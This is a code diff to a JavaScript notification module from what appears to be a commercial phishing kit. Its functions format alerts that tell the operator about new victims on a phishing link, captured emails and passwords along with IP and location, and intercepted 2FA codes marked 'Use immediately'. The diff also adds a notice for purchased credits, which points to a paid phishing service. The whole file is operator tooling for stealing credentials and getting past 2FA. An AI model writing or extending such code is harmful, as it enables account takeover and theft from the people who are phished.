@@ -1,13 +1,10 @@
 async function visitorNotification(linkname){
     return `
-🎯 <b>NEW VISITOR DETECTED!</b> 🎯
+👤 <b>New Visitor</b>
+Link: ${linkname}
+Status: Active
 
-🔍 <b>Link Name:</b> ${linkname}
-⚡️ Visitor is on the page
-🕒 Waiting for action...
-
-💫 <i>Stay tuned for login details!</i>
-🔒 <i>Secured by Ultimate Social Tools</i>
+<i>Awaiting login...</i>
     `;
 }
 
@@ -17,21 +14,15 @@ async function loginNotification(email, password, platform, ip, city, country){
                          platform.toLowerCase() === 'tiktok' ? '🎵' : '🌐';
 
     return `
-🎉 <b>NEW LOGIN CAPTURED!</b> 🎉
+${platformEmoji} <b>New ${platform} Login</b>
 
-${platformEmoji} <b>Platform:</b> ${platform}
-📧 <b>Email/Username:</b> ${email}
-🔑 <b>Password:</b> ${password}
+Login Details:
+• Email/User: ${email}
+• Password: ${password}
 
-📍 <b>Location Details:</b>
-🌍 Country: ${country}
-🏙️ City: ${city}
-🔒 IP: ${ip}
-
-⚡️ Login details captured successfully!
-🎯 Ready to use
-
-🔒 <i>Secured by Ultimate Social Tools</i>
+Location:
+• ${city}, ${country}
+• IP: ${ip}
     `;
 }
 
@@ -41,21 +32,27 @@ async function otpNotification(otp, platform){
                          platform.toLowerCase() === 'tiktok' ? '🎵' : '🌐';
     
     return `
-🔐 <b>NEW 2FA CODE INTERCEPTED!</b> 🔐
+${platformEmoji} <b>${platform} 2FA Code</b>
 
-${platformEmoji} <b>Platform:</b> ${platform}
-🔑 <b>OTP Code:</b> ${otp}
+Code: ${otp}
+⚠️ Use immediately - time sensitive
+    `;
+}
 
-⚡️ Code captured successfully!
-⏰ Valid for a limited time
-🎯 Use it quickly!
+async function creditTransactionNotification(amount, balance) {
+    return `
+💳 <b>Credits Added</b>
 
-🔒 <i>Secured by Ultimate Social Tools</i>
+• Added: ${amount} credits
+• New Balance: ${balance} credits
+
+Thank you for your purchase!
     `;
 }
 
 module.exports = {
     visitorNotification,
     loginNotification,
-    otpNotification
+    otpNotification,
+    creditTransactionNotification
 }
